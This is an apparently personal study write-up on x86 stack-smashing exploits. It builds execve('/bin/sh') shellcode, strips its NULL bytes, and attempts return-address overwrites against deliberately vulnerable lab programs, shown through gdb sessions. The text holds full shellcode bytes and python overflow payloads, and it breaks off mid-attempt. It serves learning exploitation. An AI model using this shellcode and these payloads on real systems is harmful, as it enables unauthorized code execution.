# Unit 3: Stack Smashing Exploits

## Shell Code and System Calls in x86

### What is a "shell code"?

- __Shellcode__ refers to a small binary code that spawns a shell.
- Shellcode is not a whole exploit, it's just the __payload__.
- You overwrite the return address to point to your *shellcode*.
- You fill the buffer with nops and your shellcode which needs to be executed.
- Essentially your return address should point to somewhere on the current stack.
- Good shell code is small and doesn't contain NULL bytes.
    - NULL bytes are a problem, because they terminate a char array in C.
    - If your shellcode has a single null byte __it will cut of from the rest of the shellcode.__

## Executing a Shell in C and in x86

- Take a look at the `shell.c` and compile it with:

```sh
$ gcc -m32 -fno-stack-protector -z execstack -Wno-format-security -g -mpreferred-stack-boundary=2 --static shell.c -o bin/shell
```

- Essentially this program replaces itself with another program, that is `/bin/sh`.

### Disassembling x64 `bin/shell`

- Because at first I haven't compiled this program to be 32 bit, I disassembled and analyzed 64 bit version.
- Disassemble both `main` and `execve`:

```asm
$ gdb -q bin/shell
Reading symbols from bin/shell...
(gdb) ds main
Dump of assembler code for function main:
   0x0000000000401805 <+0>:     push   rbp
   0x0000000000401806 <+1>:     mov    rbp,rsp
   0x0000000000401809 <+4>:     sub    rsp,0x10
   0x000000000040180d <+8>:     lea    rax,[rip+0x797fc]        # 0x47b010
   0x0000000000401814 <+15>:    mov    QWORD PTR [rbp-0x10],rax
   0x0000000000401818 <+19>:    mov    QWORD PTR [rbp-0x8],0x0
   0x0000000000401820 <+27>:    mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000401824 <+31>:    lea    rcx,[rbp-0x10]
   0x0000000000401828 <+35>:    mov    edx,0x0
   0x000000000040182d <+40>:    mov    rsi,rcx
   0x0000000000401830 <+43>:    mov    rdi,rax
   0x0000000000401833 <+46>:    call   0x411160 <execve>
   0x0000000000401838 <+51>:    mov    eax,0x0
   0x000000000040183d <+56>:    leave
   0x000000000040183e <+57>:    ret
End of assembler dump.
(gdb) ds execve
Dump of assembler code for function execve:
   0x0000000000411160 <+0>:     endbr64
   0x0000000000411164 <+4>:     mov    eax,0x3b
   0x0000000000411169 <+9>:     syscall
   0x000000000041116b <+11>:    cmp    rax,0xfffffffffffff001
   0x0000000000411171 <+17>:    jae    0x411174 <execve+20>
   0x0000000000411173 <+19>:    ret
   0x0000000000411174 <+20>:    mov    rcx,0xffffffffffffffd8
   0x000000000041117b <+27>:    neg    eax
   0x000000000041117d <+29>:    mov    DWORD PTR fs:[rcx],eax
   0x0000000000411180 <+32>:    or     rax,0xffffffffffffffff
   0x0000000000411184 <+36>:    ret
End of assembler dump.
(gdb) x/s 0x47b010
0x47b010:       "/bin/sh"
```

- Before `execve` call, arguments must be passed to `rdi`, `rsi`, `rdx`, respectively.
- `rdi` is the first argument, which is the first element from an array, the string `/bin/sh`.
- `rsi` holds the address of the whole array `args` (due to `lea` instruction). 
- `rdx` (`edx`) holds the `NULL`.
- After the call to `execve` program just returns `0` if everything went smooth.


## Creating shellcode

- Go look at `shell.asm`, then generate raw bytes from it:

```sh
$ readelf -x .text shell

Hex dump of section '.text':
  0x08049000 6a006800 a00408b8 0b000000 bb00a004 j.h.............
  0x08049010 0889e1ba 00000000 cd80b801 00000031 ...............1
  0x08049020 dbcd80                              ...
```

- Now extract those bytes using your Linux wizardry:

```sh
$ readelf -x .text shell | grep 0x080 | tr -s " " | cut -d " " -f 3,4,5,6 | tr "\n" " " | sed "s/ //g" | sed "s/\.//g"
6a006800a00408b80b000000bb00a0040889e1ba00000000cd80b80100000031dbcd80
```

- Now we have a hex string, which needs to be transformed further:

```sh
$ bytes=$(readelf -x .text shell | grep 0x080 | tr -s " " | cut -d " " -f 3,4,5,6 | tr "\n" " " | sed "s/ //g" | sed "s/\.//g")
$ echo $bytes
6a006800a00408b80b000000bb00a0040889e1ba00000000cd80b80100000031dbcd80
$ echo $bytes | python3 -c "import sys; hex=sys.stdin.read().strip(); print(''.join('\\\\x%s%s'%(hex[i*2],hex[i*2+1]) for i in range(int(len(hex)/2))))"
\x6a\x00\x68\x00\xa0\x04\x08\xb8\x0b\x00\x00\x00\xbb\x00\xa0\x04\x08\x89\xe1\xba\x00\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\x31\xdb\xcd\x80
```

- And now we have our shell code in correct byte code format.
- You can go even further and put it into environment variable, or automate the whole processs with `sh` script `hexconverter`

```sh
$ ./hexconverter shell
\x6a\x00\x68\x00\xa0\x04\x08\xb8\x0b\x00\x00\x00\xbb\x00\xa0\x04\x08\x89\xe1\xba\x00\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\x31\xdb\xcd\x80
```

### Test drive

- Let's try executing this program in C with `tester.c`.
- I have cast this char pointer into function pointer and called it, but executing `bin/tester` results in nothing:

```sh
$ ./bin/tester
$
```

- Let's dive into gdb to inspect this more closely:

```sh
(gdb) ds main
Dump of assembler code for function main:
   0x08049156 <+0>:     push   ebp
   0x08049157 <+1>:     mov    ebp,esp
   0x08049159 <+3>:     and    esp,0xfffffff0
   0x0804915c <+6>:     sub    esp,0x10
   0x0804915f <+9>:     call   0x8049180 <__x86.get_pc_thunk.ax>
   0x08049164 <+14>:    add    eax,0x2e90
   0x08049169 <+19>:    lea    eax,[eax-0x1fec]
   0x0804916f <+25>:    mov    DWORD PTR [esp+0xc],eax
   0x08049173 <+29>:    mov    eax,DWORD PTR [esp+0xc]
   0x08049177 <+33>:    call   eax
   0x08049179 <+35>:    mov    eax,0x0
   0x0804917e <+40>:    leave
   0x0804917f <+41>:    ret
End of assembler dump.
```

- Something at this offset `[eax-0x1fec]` is being called by our assembly program.
- At this address are instructions from `shell.asm`, which should spawn us a shell.

```asm
(gdb) x/10i $eax
=> 0x804a008:   push   0x0
   0x804a00a:   push   0x804a000
   0x804a00f:   mov    eax,0xb
   0x804a014:   mov    ebx,0x804a000
   0x804a019:   mov    ecx,esp
   0x804a01b:   mov    edx,0x0
   0x804a020:   int    0x80
   0x804a022:   mov    eax,0x1
   0x804a027:   xor    ebx,ebx
   0x804a029:   int    0x80
```

- And if you examine `0x804a000`, you see that it's not `bin/sh` string at all:

```asm
(gdb) x/s 0x804a000
0x804a000 <_fp_hw>:     "\003"
```

- This is due to __Fixed references__.

### Solving fixed references with jmp-callback trick

- Check out `shellv2.asm`. It is revised shell, which will use little bit of indirection.
- `_start` doesn't do much, except to jump to `callback`.
- `callback` calls `callshell` which pushes the `"/bin/sh"` on the stack.
- This way you get reference to `"/bin/sh"` instead of some garbage.
- That's because `call` instruction doesn't only jump to specified label, but it will also __push onto the stack the return address.__
    - This return address is actually the string `"/bin/sh"`.
    - Then inside `callshell` this command is placed into `esi` register for further usage.

- Hex convert this program and put into `testerv2.c`.
- Compile it with:

```sh
$ gcc -m32 -fno-stack-protector -z execstack -Wno-format-security -g -mpreferred-stack-boundary=2 --static testerv2.c -o bin/testerv2
$ ./bin/testerv2
sh-5.2$ cal
     August 2024
Su Mo Tu We Th Fr Sa
             1  2  3
 4  5  6  7  8  9 10
11 12 13 14 15 16 17
18 19 20 21 22 23 24
25 26 27 28 29 30 31
```

- ~~If you compile it and run it well you will get `SEGFAULT` again...~~
- This time we get a functional shell!
- __The solution to segfault was__ modifying `char *code` to `char code[]`.
- It's simple, because first one tells `code` is a pointer to a char, second tells `code` is char array.
    - These two aren't the same!

## Null bytes are the issue!

- See the test drive program that will simulate being vulnerable, `vulnprog.c`.
- The point with `vulnprog.c` is to be able to execute our shellcode like this:

```sh
$ ./hexconverter bin/shellv2
\xeb\x20\x5e\x6a\x00\x56\xb8\x0b\x00\x00\x00\x89\xf3\x89\xe1\xba\x00\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x01\x00\x00\x00\xcd\x80\xe8\xdb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00
$ ./bin/vulnprog $(printf "\xeb\x20\x5e\x6a\x00\x56\xb8\x0b\x00\x00\x00\x89\xf3\x89\xe1\xba\x00\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x01\x00\x00\x00\xcd\x80\xe8\xdb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00")
-bash: warning: command substitution: ignored null byte in input
Segmentation fault (core dumped)
```

- Let's get into `gdb` to see where the real issue lies...

```sh
(gdb) ds main
Dump of assembler code for function main:
   0x08049166 <+0>:     lea    ecx,[esp+0x4]
   0x0804916a <+4>:     and    esp,0xfffffff0
   0x0804916d <+7>:     push   DWORD PTR [ecx-0x4]
   0x08049170 <+10>:    push   ebp
   0x08049171 <+11>:    mov    ebp,esp
   0x08049173 <+13>:    push   ebx
   0x08049174 <+14>:    push   ecx
   0x08049175 <+15>:    sub    esp,0x400
   0x0804917b <+21>:    call   0x80491c0 <__x86.get_pc_thunk.ax>
   0x08049180 <+26>:    add    eax,0x2e74
   0x08049185 <+31>:    mov    edx,ecx
   0x08049187 <+33>:    mov    edx,DWORD PTR [edx+0x4]
   0x0804918a <+36>:    add    edx,0x4
   0x0804918d <+39>:    mov    edx,DWORD PTR [edx]
   0x0804918f <+41>:    sub    esp,0x4
   0x08049192 <+44>:    push   0x400
   0x08049197 <+49>:    push   edx
   0x08049198 <+50>:    lea    edx,[ebp-0x408]
   0x0804919e <+56>:    push   edx
   0x0804919f <+57>:    mov    ebx,eax
   0x080491a1 <+59>:    call   0x8049040 <strncpy@plt>
   0x080491a6 <+64>:    add    esp,0x10
   0x080491a9 <+67>:    lea    eax,[ebp-0x408]
   0x080491af <+73>:    call   eax
   0x080491b1 <+75>:    mov    eax,0x0
   0x080491b6 <+80>:    lea    esp,[ebp-0x8]
   0x080491b9 <+83>:    pop    ecx
   0x080491ba <+84>:    pop    ebx
   0x080491bb <+85>:    pop    ebp
   0x080491bc <+86>:    lea    esp,[ecx-0x4]
   0x080491bf <+89>:    ret
End of assembler dump.
(gdb) b *main+73
Breakpoint 1 at 0x80491af: file vulnprog.c, line 10.
(gdb) r $(printf "\xeb\x20\x5e\x6a\x00\x56\xb8\x0b\x00\x00\x00\x89\xf3\x89\xe1\xba\x00\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x01\x00\x00\x00\xcd\x80\xe8\xdb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00")
Starting program: ./bin/vulnprog $(printf "\xeb\x20\x5e\x6a\x00\x56\xb8\x0b\x00\x00\x00\x89\xf3\x89\xe1\xba\x00\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x01\x00\x00\x00\xcd\x80\xe8\xdb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00")

Breakpoint 1, 0x080491af in main (argc=3, argv=0xffffd064) at vulnprog.c:10
10        ((void(*)(void)) code)();
(gdb) x/10i $ebp-0x408
   0xffffcb90:  jmp    0xffffcb92
   0xffffcb92:  add    BYTE PTR [eax],al
   0xffffcb94:  add    BYTE PTR [eax],al
   0xffffcb96:  add    BYTE PTR [eax],al
   0xffffcb98:  add    BYTE PTR [eax],al
   0xffffcb9a:  add    BYTE PTR [eax],al
   0xffffcb9c:  add    BYTE PTR [eax],al
   0xffffcb9e:  add    BYTE PTR [eax],al
   0xffffcba0:  add    BYTE PTR [eax],al
   0xffffcba2:  add    BYTE PTR [eax],al
```

- As you can see I set breakpoint right before the call to see what is inside `eax` before it gets called.
- But inspecting the offset `$ebp-0x408` and you can see a `jmp` instruction which ruins your life.
- Well our command line argument the `printf` command contains a string with __5 null byte characters.__
- And that is a problem, __because `strncpy` function stops at first null byte character.__

## Removing NULL bytes

- Look at the `objdump` of previous shellcode and you will see that the following instructions create NULL bytes:
1. `push 0x0` - pushing a NULL value
2. `push e*b` - pushing any 4 byte register

- Solution to the first problem is to use `xor` operation to create NULL bytes without actually writing any of them.
- Solution to the second problem is to use `BYTE PTR` instead of `DWORD PTR` (using first byte of those registers).

- Check `shellv3.asm`, assemble it and run `objdump` against it:

```sh
$ objdump -M intel -d ./bin/shellv3

Disassembly of section .text:

08049000 <_start>:
 8049000:       eb 17                   jmp    8049019 <callback>

08049002 <callshell>:
 8049002:       5e                      pop    esi
 8049003:       31 c0                   xor    eax,eax
 8049005:       50                      push   eax
 8049006:       56                      push   esi
 8049007:       31 d2                   xor    edx,edx
 8049009:       b0 0b                   mov    al,0xb
 804900b:       89 f3                   mov    ebx,esi
 804900d:       89 e1                   mov    ecx,esp
 804900f:       cd 80                   int    0x80
 8049011:       31 c0                   xor    eax,eax
 8049013:       b0 01                   mov    al,0x1
 8049015:       31 db                   xor    ebx,ebx
 8049017:       cd 80                   int    0x80

08049019 <callback>:
 8049019:       e8 e4 ff ff ff          call   8049002 <callshell>
 804901e:       2f                      das
 804901f:       62 69 6e                bound  ebp,QWORD PTR [ecx+0x6e]
 8049022:       2f                      das
 8049023:       73 68                   jae    804908d <callback+0x74>
```

- No more NULL bytes, now convert it into hex bytes string and run it inside `./bin/vulnprog`:

```sh
noobuntu@noobuntu-VirtualBox:~/nightmare/bof/shellcodin$ ./bin/vulnprog `printf "\xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\xb0\x0b\x89\xf3\x89\xe1\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"`
$ id
uid=1000(noobuntu) gid=1000(noobuntu) groups=1000(noobuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare)
$
```

## Stack smashing with shell code

- What follows are the attempts to exploit __`nightmare/04-overflows/function_calling/silly.c`__ program using the shell code we created.

### Attempt #1

```sh
                   .-------------------------.
                   |                         |
                   v                         |
    ./vulnerable 5 <shell-code><padding><address-of-buf>
```

- This approach will fail, because the padding is after our shellcode, our shellcode will also contain the padding which isn't valid.
- Length of our shell code is 37:

```sh
noobuntu@noobuntu-VirtualBox:~/nightmare/bof/shellcodin$ printf "\xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\xb0\x0b\x89\xf3\x89\xe1\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" | wc -c
37
```

- Following is a gdb analysis:

```sh
(gdb) r 5 `python3 -c "import sys; sys.stdout.buffer.write(b'\xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\xb0\x0b\x89\xf3\x89\xe1\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+b'A'*11+b'\x9c\xcf\xff\xff')"`
Starting program: silly 5 `python3 -c "import sys; sys.stdout.buffer.write(b'\xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\xb0\x0b\x89\xf3\x89\xe1\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+b'A'*11+b'\x9c\xcf\xff\xff')"`

Breakpoint 1, main (argc=3, argv=0xffffd074) at silly.c:26
26      in silly.c
(gdb) c
Continuing.

Breakpoint 2, vuln (n=5,
    str=0xffffd29d "\353\027^1\300PV1Ұ\v\211\363\211\341̀1\300\260\0011\333̀\350\344\377\377\377/bin/sh", 'A' <repeats 11 times>, "\234\317\377\377")
    at silly.c:14
14      in silly.c
(gdb)
(gdb) ds
Dump of assembler code for function vuln:
   0x080491ec <+0>:     push   ebp
   0x080491ed <+1>:     mov    ebp,esp
   0x080491ef <+3>:     push   ebx
   0x080491f0 <+4>:     sub    esp,0x34
   0x080491f3 <+7>:     call   0x80490d0 <__x86.get_pc_thunk.bx>
   0x080491f8 <+12>:    add    ebx,0x2dfc
=> 0x080491fe <+18>:    mov    DWORD PTR [ebp-0xc],0x0
   0x08049205 <+25>:    sub    esp,0x8
   0x08049208 <+28>:    push   DWORD PTR [ebp+0xc]
   0x0804920b <+31>:    lea    eax,[ebp-0x2c]
   0x0804920e <+34>:    push   eax
   0x0804920f <+35>:    call   0x8049050 <strcpy@plt>
   0x08049214 <+40>:    add    esp,0x10
   0x08049217 <+43>:    jmp    0x8049239 <vuln+77>
   0x08049219 <+45>:    mov    eax,DWORD PTR [ebp-0xc]
   0x0804921c <+48>:    lea    edx,[eax+0x1]
   0x0804921f <+51>:    mov    DWORD PTR [ebp-0xc],edx
   0x08049222 <+54>:    sub    esp,0x4
   0x08049225 <+57>:    lea    edx,[ebp-0x2c]
   0x08049228 <+60>:    push   edx
   0x08049229 <+61>:    push   eax
   0x0804922a <+62>:    lea    eax,[ebx-0x1fc3]
   0x08049230 <+68>:    push   eax
   0x08049231 <+69>:    call   0x8049040 <printf@plt>
   0x08049236 <+74>:    add    esp,0x10
   0x08049239 <+77>:    mov    eax,DWORD PTR [ebp-0xc]
   0x0804923c <+80>:    cmp    eax,DWORD PTR [ebp+0x8]
   0x0804923f <+83>:    jl     0x8049219 <vuln+45>
   0x08049241 <+85>:    nop
   0x08049242 <+86>:    nop
   0x08049243 <+87>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x08049246 <+90>:    leave
   0x08049247 <+91>:    ret
End of assembler dump.
(gdb) ni 6
0x08049214      17      in silly.c
(gdb) ds
Dump of assembler code for function vuln:
   0x080491ec <+0>:     push   ebp
   0x080491ed <+1>:     mov    ebp,esp
   0x080491ef <+3>:     push   ebx
   0x080491f0 <+4>:     sub    esp,0x34
   0x080491f3 <+7>:     call   0x80490d0 <__x86.get_pc_thunk.bx>
   0x080491f8 <+12>:    add    ebx,0x2dfc
   0x080491fe <+18>:    mov    DWORD PTR [ebp-0xc],0x0
   0x08049205 <+25>:    sub    esp,0x8
   0x08049208 <+28>:    push   DWORD PTR [ebp+0xc]
   0x0804920b <+31>:    lea    eax,[ebp-0x2c]
   0x0804920e <+34>:    push   eax
   0x0804920f <+35>:    call   0x8049050 <strcpy@plt>
=> 0x08049214 <+40>:    add    esp,0x10
   0x08049217 <+43>:    jmp    0x8049239 <vuln+77>
   0x08049219 <+45>:    mov    eax,DWORD PTR [ebp-0xc]
   0x0804921c <+48>:    lea    edx,[eax+0x1]
   0x0804921f <+51>:    mov    DWORD PTR [ebp-0xc],edx
   0x08049222 <+54>:    sub    esp,0x4
   0x08049225 <+57>:    lea    edx,[ebp-0x2c]
   0x08049228 <+60>:    push   edx
   0x08049229 <+61>:    push   eax
   0x0804922a <+62>:    lea    eax,[ebx-0x1fc3]
   0x08049230 <+68>:    push   eax
   0x08049231 <+69>:    call   0x8049040 <printf@plt>
   0x08049236 <+74>:    add    esp,0x10
   0x08049239 <+77>:    mov    eax,DWORD PTR [ebp-0xc]
   0x0804923c <+80>:    cmp    eax,DWORD PTR [ebp+0x8]
   0x0804923f <+83>:    jl     0x8049219 <vuln+45>
   0x08049241 <+85>:    nop
   0x08049242 <+86>:    nop
   0x08049243 <+87>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x08049246 <+90>:    leave
   0x08049247 <+91>:    ret
End of assembler dump.
(gdb) p $ebp-0xc
$2 = (void *) 0xffffcf6c
(gdb) ni
19      in silly.c
(gdb) ds
Dump of assembler code for function vuln:
   0x080491ec <+0>:     push   ebp
   0x080491ed <+1>:     mov    ebp,esp
   0x080491ef <+3>:     push   ebx
   0x080491f0 <+4>:     sub    esp,0x34
   0x080491f3 <+7>:     call   0x80490d0 <__x86.get_pc_thunk.bx>
   0x080491f8 <+12>:    add    ebx,0x2dfc
   0x080491fe <+18>:    mov    DWORD PTR [ebp-0xc],0x0
   0x08049205 <+25>:    sub    esp,0x8
   0x08049208 <+28>:    push   DWORD PTR [ebp+0xc]
   0x0804920b <+31>:    lea    eax,[ebp-0x2c]
   0x0804920e <+34>:    push   eax
   0x0804920f <+35>:    call   0x8049050 <strcpy@plt>
   0x08049214 <+40>:    add    esp,0x10
=> 0x08049217 <+43>:    jmp    0x8049239 <vuln+77>
   0x08049219 <+45>:    mov    eax,DWORD PTR [ebp-0xc]
   0x0804921c <+48>:    lea    edx,[eax+0x1]
   0x0804921f <+51>:    mov    DWORD PTR [ebp-0xc],edx
   0x08049222 <+54>:    sub    esp,0x4
   0x08049225 <+57>:    lea    edx,[ebp-0x2c]
   0x08049228 <+60>:    push   edx
   0x08049229 <+61>:    push   eax
   0x0804922a <+62>:    lea    eax,[ebx-0x1fc3]
   0x08049230 <+68>:    push   eax
   0x08049231 <+69>:    call   0x8049040 <printf@plt>
   0x08049236 <+74>:    add    esp,0x10
   0x08049239 <+77>:    mov    eax,DWORD PTR [ebp-0xc]
   0x0804923c <+80>:    cmp    eax,DWORD PTR [ebp+0x8]
   0x0804923f <+83>:    jl     0x8049219 <vuln+45>
   0x08049241 <+85>:    nop
   0x08049242 <+86>:    nop
   0x08049243 <+87>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x08049246 <+90>:    leave
   0x08049247 <+91>:    ret
End of assembler dump.
(gdb) x/x $ebp+0xc
0xffffcf84:     0xffffd29d
(gdb) x/x $ebp-0xc
0xffffcf6c:     0x732f6e69
(gdb) x/16i 0x732f6e69
   0x732f6e69:  Cannot access memory at address 0x732f6e69
(gdb) x/16i 0xffffd29d
   0xffffd29d:  jmp    0xffffd2b6
   0xffffd29f:  pop    esi
   0xffffd2a0:  xor    eax,eax
   0xffffd2a2:  push   eax
   0xffffd2a3:  push   esi
   0xffffd2a4:  xor    edx,edx
   0xffffd2a6:  mov    al,0xb
   0xffffd2a8:  mov    ebx,esi
   0xffffd2aa:  mov    ecx,esp
   0xffffd2ac:  int    0x80
   0xffffd2ae:  xor    eax,eax
   0xffffd2b0:  mov    al,0x1
   0xffffd2b2:  xor    ebx,ebx
   0xffffd2b4:  int    0x80
   0xffffd2b6:  call   0xffffd29f
   0xffffd2bb:  das
(gdb) x/s 0xffffd2bb
0xffffd2bb:     "/bin/sh", 'A' <repeats 11 times>, "\234\317\377\377"
```

- As you can see, `0xffffd2bb` which should only contain only `/bin/sh` also contains the padding which makes our shell code faulty.

## Attempt #2

- How about instead of jumping backwards, to try jumping forward.

```sh
                                             .-----------.
                                             |           |
                                             |           v
   ./vulnerable 5 <--------padding-----><address-of-buf><shell code>
```

- Let's format this exploit as mentioned above and run it inside `gdb`:

```sh
(gdb) r 5 `python3 -c "import sys; sys.stdout.buffer.write(b'A'*48+b'\x9c\xcf\xff\xff'+b'\xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\xb0\x0b\x89\xf3\x89\xe1\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68')"`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: silly 5 `python3 -c "import sys; sys.stdout.buffer.write(b'A'*48+b'\x9c\xcf\xff\xff'+b'\xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\xb0\x0b\x89\xf3\x89\xe1\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68')"`

Breakpoint 2, vuln (n=5,
    str=0xffffd278 'A' <repeats 48 times>, "\234\317\377\377\353\027^1\300PV1Ұ\v\211\363\211\341̀1\300\260\0011\333̀\350\344\377\377\377/bin/sh")
    at silly.c:14
14      in silly.c
(gdb) x/x $ebp+8
0xffffcf60:     0x05
```

- As you can see trying this approach will fail too, because `0xffffcf60` address ends with `0` which is same as NULL byte.


---

### Previous problems with exploitation 

- Running this in `gdb` will create a hell of output for some reason:

```sh
(gdb) r 5 `python3 -c "import sys; sh=open('shell', mode='rb').read(); sys.stdout.buffer.write(b'\x41'*(0x30)+b'\xdc\xce\xff\xff'+sh)"`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: shellcode/unit_03_shell/bin/vulnerable 5 `python3 -c "import sys; sh=open('shell', mode='rb').read(); sys.stdout.buffer.write(b'\x41'*(0x30)+b'\xdc\xce\xff\xff'+sh)"`
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
1094795585 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAA\xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\xb0\x0b\x89\xf3\x89\xe1\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
1094795586 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAA\xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\xb0\x0b\x89\xf3\x89\xe1\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
1094795587 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAAAAAA\xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\xb0\x0b\x89\xf3\x89\xe1\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
1094795588 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAA\xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\xb0\x0b\x89\xf3\x89\xe1\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
1094795589 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFAAAAAAAAAAAAAAA\xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\xb0\x0b\x89\xf3\x89\xe1\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
1094795590 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAAAAAAAAAAAA\xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\xb0\x0b\x89\xf3\x89\xe1\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
1094795591 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHAAAAAAAAAAAAAAA\xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\xb0\x0b\x89\xf3\x89\xe1\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
--- snip ---
```

- This spam of countless lines doesn't even stop it's almost like it's in infinite loop.
- I've tried writing `exploit.py` to try to automate this process.
- But whenever I'm supposed to pop a shell, countless lines of my input are thrown at me.
- That is because while overflowing the buffer, I'm also changing the contents of variables `i`, and `n` which are supposed to control the while loop.

--- 


## Attempt #3


- Let's format our exploit like this:

```sh
                                             .------------------------.
                                             |                        |
                                             |                        v
   ./vulnerable 5 <--------padding-----><address-of-shelcode><padding><shell code>
```


- But first, lets calculate the address:


```sh
(gdb) r 5 `python3 -c "import sys; sys.stdout.buffer.write(b'A'*48+b'\xef\xbe\xad\xde'+b'A'*4+b'\xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\xb0\x0b\x89\xf3\x89\xe1\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+b'\x00')"`
Starting program: shellcode/unit_03_shell/bin/silly 5 `python3 -c "import sys; sys.stdout.buffer.write(b'A'*48+b'\xef\xbe\xad\xde'+b'A'*4+b'\xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\xb0\x0b\x89\xf3\x89\xe1\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+b'\x00')"`
/bin/bash: line 1: warning: command substitution: ignored null byte in input

Breakpoint 2, vuln (n=5,
    str=0xffffd274 'A' <repeats 48 times>, "ﾭ\336AAAA\353\027^1\300PV1Ұ\v\211\363\211\341̀1\300\260\0011\333̀\350\344\377\377\377/bin/sh") at silly.c:14
14      in silly.c
(gdb) ni 6
0x08049214      17      in silly.c
(gdb) x/x $ebp+0xc
0xffffcf64:     0xeb
(gdb) x/3wx $ebp
0xffffcf58:     0x41414141      0xdeadbeef      0x41414141
(gdb) x/x $ebp+4
0xffffcf5c:     0xdeadbeef
```

- So the target address is `0xffffcf64`.

```sh
(gdb) r 5 `python3 -c "import sys; sys.stdout.buffer.write(b'A'*48+b'\x64\xcf\xff\xff'+b'A'*4+b'\xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\xb0\x0b\x89\xf3\x89\xe1\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+b'\x00')"`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: shellcode/unit_03_shell/bin/silly 5 `python3 -c "import sys; sys.stdout.buffer.write(b'A'*48+b'\x64\xcf\xff\xff'+b'A'*4+b'\xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\xb0\x0b\x89\xf3\x89\xe1\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+b'\x00')"`
/bin/bash: line 1: warning: command substitution: ignored null byte in input
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".

Breakpoint 2, vuln (n=5,
    str=0xffffd274 'A' <repeats 48 times>, "d\317\377\377AAAA\353\027^1\300PV1Ұ\v\211\363\211\341̀1\300\260\0011\333̀\350\344\377\377\377/bin/sh")
